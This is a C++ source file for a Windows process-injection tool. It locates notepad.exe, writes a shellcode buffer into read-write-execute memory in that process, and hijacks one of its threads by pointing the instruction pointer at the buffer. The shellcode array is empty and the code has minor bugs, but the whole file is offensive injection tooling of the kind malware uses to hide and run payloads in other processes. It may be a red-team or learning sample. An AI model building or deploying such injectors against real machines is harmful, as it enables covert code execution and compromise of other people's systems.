#include "includes.h"


#define PROCESS_NAME L"notepad.exe"

DWORD FindProcess(HANDLE hSnapShot) {
	PROCESSENTRY32 peProcess = { sizeof(peProcess) };
	if (!Process32First(hSnapShot, &peProcess)) {
		wcout << L"[+] Error in getting first process from snapshot" << endl;
		return 0;
	}
	do {
		if (!lstrcmp(PROCESS_NAME, peProcess.szExeFile)) {
			return peProcess.th32ProcessID;
		}
	} while (Process32Next(hSnapShot, &peProcess));

	wcout << L"[+] Process with the name: " << PROCESS_NAME << L" was not found" << endl;
	return 0;

}

PVOID InjectnewFunction(DWORD processId) {
	//Shellcode
	unsigned char b[] =
		"";
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	PVOID pMem = VirtualAllocEx(hProcess, NULL, sizeof(b), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DWORD64 bytesWriten = 0;
	WriteProcessMemory(hProcess, pMem, b, sizeof(b), &bytesWriten);
	if (bytesWriten == 0) {
		wcout << L"[+] Shellcode was not written to remote process\n";
		return NULL;
	}
	CloseHandle(hProcess);
	return pMem;
}

HANDLE GetProcessThread(HANDLE hSnapShot, DWORD processId) {
	THREADENTRY32 teThread = { sizeof(teThread) };
	if (!Thread32First(hSnapShot, &teThread)) {
		wcout << L"[+] Error in getting first thread from process: " << processId << endl;
		return NULL;
	}
	do {
		if (teThread.th32OwnerProcessID == processId && teThread.th32ThreadID != 0) {
			HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, teThread.th32ThreadID);
			if (hSnapShot == INVALID_HANDLE_VALUE || hSnapShot == NULL) {
				continue;
			}
			return hThread;

		}
	} while (Thread32Next(hSnapShot, &teThread));

	wcout << "[+] Coudn't open a thread from: " << PROCESS_NAME << endl;
	return NULL;
}

int main() {

	wcout << L"[+] Looking for process with the name: " << PROCESS_NAME << endl;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE || hSnapShot == NULL) {
		wcout << L"[+] Error in getting process snapshot\n";
		return 0;
	}
	DWORD processId = FindProcess(hSnapShot);
	if (processId != 0) {
		wcout << L"[+] Process with the name: " << PROCESS_NAME << L" has the ID of: " << processId << endl;
		hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, processId);
		HANDLE hThread = GetProcessThread(hSnapShot, processId);
		if (hThread) {
			wcout << L"[+] Thread: 0x" << hThread << " was opened" << endl;
			PVOID pMem = InjectnewFunction(processId);
			if (pMem) {
				SuspendThread(hThread);
				CONTEXT ctx;
				GetThreadContext(hThread, &ctx);
				ctx.ContextFlags = CONTEXT_CONTROL;
				ctx.Rip = (DWORD64)pMem;
				SetThreadContext(hThread, &ctx);
				ResumeThread(hThread);
			}
		}
		CloseHandle(hThread);
	}
	CloseHandle(hSnapShot);
	return 0;

}